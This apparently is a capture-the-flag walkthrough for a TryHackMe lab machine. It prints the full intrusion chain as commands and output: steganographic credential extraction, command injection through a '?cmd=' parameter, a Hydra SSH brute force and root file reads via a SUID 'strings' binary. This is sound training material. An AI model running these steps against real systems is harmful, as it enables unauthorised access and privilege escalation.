# Jack of All Trades — Full Walkthrough

**Target:** `10.49.139.173`
**OS:** Linux (Debian)
**Difficulty:** Easy / Medium
**Flags:** 2 (User + Root)

---

## Flags Captured

| # | Flag | Method | Status |
|---|------|--------|--------|
| 1 | `Flag{...}` | User flag — visually embedded in `user.jpg` | ✅ |
| 2 | `Flag{...}` | Root flag — SUID `strings` read `/root/root.txt` | ✅ |

---

## Reconnaissance

### Step 1: Nmap — Discovering Swapped Ports

Initial scan reveals two open ports — but the services are **swapped**:

```bash
└─$ nmap -sC -sV 10.49.139.173 -oN nmap_scan.txt
PORT   STATE SERVICE VERSION
22/tcp open  http    Apache httpd 2.4.10 ((Debian))
80/tcp open  ssh     OpenSSH 6.7p1 Debian 5 (protocol 2.0)
```

Port **22** (normally SSH) is running **Apache HTTP**, and port **80** (normally HTTP) is running **OpenSSH**.

---

## Web Enumeration

### Step 2: Exploring the HTTP Server (Port 22)

```bash
└─$ curl -s http://10.49.139.173:22/
```

Two things hidden in HTML comments:

- **`/recovery.php`** — a hidden login page
- **Base64-encoded string** — ends with `==`

#### 2a. Decoding the Base64 Password

```bash
└─$ echo 'UmVtZW1iZXIgdG8gd2lzaCBKb2hueSBHcmF2ZXMg...=' | base64 -d
Remember to wish Johny Graves well with his crypto jobhunting! His
encoding systems are amazing! Also gotta remember your password: u?WtKSraq
```

We now have a password: **`u?WtKSraq`** and a hint about encoding systems.

---

### Step 3: The Recovery Page — Base32 → Hex → ROT13

```bash
└─$ curl -s http://10.49.139.173:22/recovery.php
```

Another hidden HTML comment (Base32 encoded string).

#### 3a. Base32 → Hex

```bash
└─$ echo 'GQ2TOMRXME3TEN3BGZTDOMRWGUZDANRX...' | base32 -d
45727a727a6f72652067756e67206775722070657271726167766e796620... (hex)
```

#### 3b. Hex → ROT13 ciphertext

```bash
└─$ echo '45727a727a6f72652067756e67206775722070...' | xxd -r -p
Erzrzore gung gur perqragvnyf gb gur erpbirel ybtva ner uvqqra ba
gur ubzrcntr! V xabj ubj sbetrgshy lbh ner, fb urer'f n uvag:
ovg.yl/2GiLD2F
```

#### 3c. ROT13 Decode

```bash
└─$ echo 'Erzrzore gung gur perqragvnyf gb gur erpbirel ybtva...' \
  | tr 'A-Za-z' 'N-ZA-Mn-za-m'
Remember that the credentials to the recovery login are hidden on the
homepage! I know how forgetful you are, so here's a hint: bit.ly/2GiLD2F
```

So the credentials are **steganographically hidden in the homepage images**.

---

### Step 4: Steganography — Extracting CMS Credentials

Download all three images:

```bash
└─$ wget http://10.49.139.173:22/assets/stego.jpg
└─$ wget http://10.49.139.173:22/assets/header.jpg
└─$ wget http://10.49.139.173:22/assets/jackinthebox.jpg
```

Using `steghide` with the password `u?WtKSraq`:

```bash
# stego.jpg is a decoy — just says "wrong image!"
└─$ steghide extract -sf header.jpg
Enter passphrase: u?WtKSraq
wrote extracted data to "cms.creds".

└─$ cat cms.creds
Here you go Jack. Good thing you thought ahead!

Username: jackinthebox
Password: TplFxiSHjY
```

CMS credentials: **`jackinthebox:TplFxiSHjY`**

---

## Exploitation

### Step 5: CMS Login — Remote Code Execution

```bash
└─$ curl -v -s -X POST http://10.49.139.173:22/recovery.php \
  -d "user=jackinthebox&pass=TplFxiSHjY"
< location: /nnxhweOV/index.php
< Set-Cookie: login=jackinthebox%3Aa78e6e9d6f7b9d0...
```

The panel has a **command injection** vulnerability via `?cmd=`:

```bash
└─$ curl -s -b "login=jackinthebox%3Aa78e6e9d6f7b9d..." \
  "http://10.49.139.173:22/nnxhweOV/index.php?cmd=id"
GET me a 'cmd' and I'll run it for you Future-Jack.
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Exploring via RCE reveals a password list:

```bash
└─$ curl -s -b "login=..." \
  "http://10.49.139.173:22/nnxhweOV/index.php?cmd=cat%20/home/jacks_password_list"
*hclqAzj+2GC+=0K
eN<A@n^zI?FE$I5,
...
ITMJpGGIqg1jn?>@
```

### Step 6: Hydra — Brute Forcing SSH on Port 80

```bash
└─$ curl -s -b "login=..." \
  "http://10.49.139.173:22/nnxhweOV/index.php?cmd=cat%20/home/jacks_password_list" \
  | tail -n +2 > passwords.txt

└─$ hydra -l jack -P passwords.txt ssh://10.49.139.173:80 -t 4
[80][ssh] host: 10.49.139.173   login: jack   password: ITMJpGGIqg1jn?>@
```

SSH password: **`ITMJpGGIqg1jn?>@`**

### Step 7: SSH Access — User Flag

```bash
└─$ ssh jack@10.49.139.173 -p 80
jack@jack-of-all-trades:~$ ls
user.jpg
```

Download and view the image to see the **user flag** visually embedded:

```bash
└─$ scp -P 80 jack@10.49.189.26:~/user.jpg .
└─$ xdg-open user.jpg
Recipe for Penguin Soup: ...
Flag{...}
```

**User Flag:** `Flag{...}`

---

## Privilege Escalation

### Step 8: SUID Strings — Root Flag

```bash
jack@jack-of-all-trades:~$ find / -perm -4000 -type f 2>/dev/null
/usr/bin/strings
/usr/sbin/exim4
/usr/bin/procmail
...
```

`/usr/bin/strings` has the **SUID bit set** — allows reading any file as root:

```bash
jack@jack-of-all-trades:~$ /usr/bin/strings /root/root.txt
ToDo:
1.Get new penguin skin rug ...
...
6.Delete this: Flag{...}
```

**Root Flag:** `Flag{...}`

---

## Vulnerability Chain Summary

- **Swapped Ports** — HTTP on port 22, SSH on port 80 bypasses standard assumptions
- **Information Disclosure** — HTML comments leak paths and base64-encoded data
- **Steganography** — Credentials hidden in JPEG images via `steghide`
- **Command Injection** — CMS panel passes user input directly to system shell
- **Weak Password List** — Password list exposed via RCE, SSH is brute-forceable
- **Misconfigured SUID** — `/usr/bin/strings` SUID allows reading any file as root

---

## Key Takeaways

- **Check all HTML comments** — They often hide paths, encoded data, and password hints
- **Don't trust port numbers** — Always verify service banners; ports can be swapped
- **Steganography is a common CTF technique** — Try `steghide` with discovered passwords
- **Multi-layer encoding** — Base32 → Hex → ROT13: identify the encoding before decoding
- **SUID binaries are gold** — Always check for unusual SUID binaries with `find / -perm -4000`

---

*Room: **Jack of All Trades** — TryHackMe | All 2 Flags Captured | Root Shell Obtained*
